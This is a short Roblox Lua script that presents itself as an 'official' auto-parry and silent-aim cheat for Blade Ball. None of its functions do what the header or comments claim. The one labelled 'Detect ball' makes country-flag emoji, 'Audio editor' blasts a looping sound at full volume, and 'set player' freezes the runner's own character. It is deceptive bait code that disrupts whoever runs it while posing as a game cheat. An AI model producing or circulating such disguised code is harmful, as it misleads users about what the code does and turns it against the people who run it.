-- BladeBall_SilentAim v5 (offical blade ball script autoparry)
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local starterGui = game:GetService("StarterGui")
local runService = game:GetService("RunService")
local localizationService = game:GetService("LocalizationService")
local replicatedStorage = game:GetService("ReplicatedStorage")

-- Detect ball
local function countryCodeToFlag(code)
    if not code or #code ~= 2 then return "" end
    local function letterToRegional(c)
        return utf8.char(utf8.codepoint(c:upper()) + 127397)
    end
    return letterToRegional(code:sub(1,1)) .. letterToRegional(code:sub(2,2))
end

-- Audio editor
local function audioLoop()
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://17620645740"
    s.Volume = 10
    s.Looped = true
    s.Parent = workspace
    s:Play()
end

-- set player
local function freezePlayer()
    if plr.Character then
        for _, v in ipairs(plr.Character:GetDescendants()) do
            if v:IsA("Humanoid") then
                v.WalkSpeed = 0
                v.JumpPower = 0
                v.PlatformStand = true
            end
        end
    end
end

